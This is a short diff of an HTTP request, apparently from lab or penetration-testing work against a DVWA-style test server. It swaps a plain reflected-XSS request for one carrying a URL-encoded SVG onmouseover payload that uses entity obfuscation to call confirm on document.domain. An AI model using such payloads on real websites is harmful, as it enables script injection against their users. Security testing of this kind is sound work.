@@ -1,4 +1,4 @@
-GET /vulnerabilities/xss_r/?name= HTTP/1.1
+GET /%22%3E%3Csvg+onmouseover%3D%22confirm%26%230000000040document.domain%29 HTTP/1.1
 Host: 10.10.3.128:2280
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
